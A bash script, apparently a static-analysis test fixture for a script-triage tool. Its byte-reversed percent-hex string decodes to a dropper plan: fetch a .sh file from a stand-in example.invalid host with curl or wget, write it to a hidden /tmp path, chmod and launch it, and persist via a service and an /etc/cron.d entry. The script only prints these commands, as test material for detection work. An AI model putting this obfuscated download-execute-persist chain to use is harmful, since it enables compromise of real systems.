#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_f3260771='%35%34%62%33%36%37%61%31%36%30%2d%65%74%61%64%70%75%2f%64%2e%6e%6f%72%63%2f%63%74%65%2f%3d%68%74%61%70%5f%6e%6f%72%63%7c%65%63%69%76%72%65%73%2e%35%34%62%33%36%37%61%31%36%30%2d%65%74%61%64%70%75%3d%65%6d%61%6e%5f%65%63%69%76%72%65%73%7c%6d%2d%65%6d%61%6e%75%3d%65%62%6f%72%70%5f%68%63%72%61%7c%35%34%62%33%36%37%61%31%36%30%2d%65%67%61%74%73%2e%2f%65%68%63%61%63%2d%73%73%65%72%74%6e%75%68%2f%70%6d%74%2f%3d%68%74%61%70%5f%65%6c%69%66%7c%35%34%62%33%36%37%61%31%36%30%2f%62%61%4c%73%73%65%72%74%6e%75%48%3d%74%6e%65%67%61%5f%72%65%73%75%7c%68%73%2e%34%61%65%38%65%62%36%65%2f%64%69%6c%61%76%6e%69%2e%65%6c%70%6d%61%78%65%2e%35%34%62%33%36%37%61%31%36%30%2f%2f%3a%73%70%74%74%68%3d%6c%72%75%7c%35%34%62%33%36%37%61%31%36%30%2d%6e%67%69%61%70%6d%61%63%3d%64%69%5f%6e%67%69%61%70%6d%61%63%7c%35%3d%74%6e%75%6f%63%5f%65%67%61%74%73%7c%6b%63%61%62%6c%6c%61%66%5f%68%63%72%61%5f%6c%72%75%63%3d%72%65%74%70%61%64%61%7c%73%73%65%63%6f%72%70%5f%68%63%74%61%70%73%69%64%2c%65%64%6f%6d%5f%65%67%6e%61%68%63%2c%65%6c%69%66%5f%65%74%69%72%77%2c%65%74%6f%6d%65%72%5f%65%72%69%75%71%63%61%2c%74%73%6f%68%5f%65%6c%69%66%6f%72%70%3d%73%70%65%74%73%7c%31%3d%76'

readonly Codec_f3260771='percent_hex|reverse_bytes|'



Load_f3260771() {

  item1=()

  local raw="${Material_f3260771}" item6

  for item6 in ${raw//%/ }; do [[ -n "$item6" ]] && item1+=("$((16#$item6))"); done

}



Decode_f3260771() {

  item2=()

  local item5

  for ((item5=0; item5<${#item1[@]}; item5++)); do

    item2[${#item1[@]}-1-item5]="${item1[item5]}"

  done

}



Recover_f3260771() {

  local -a item1 item2

  local item3 item4 item8 item5

  local -a compass=(north south); item4="$(IFS=:; printf '%s' "${compass[*]}")"

  Load_f3260771

  Decode_f3260771

  item3=''

  local octal character

  for item5 in "${!item2[@]}"; do

    printf -v octal '%03o' "${item2[item5]}"

    printf -v character '%b' "\\$octal"

    item3+="$character"

  done

  printf '%s\n' "$item3"

}



Inspect_f3260771() { Recover_f3260771; }



Plan_f3260771() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_f3260771)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")

  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_f3260771; fi

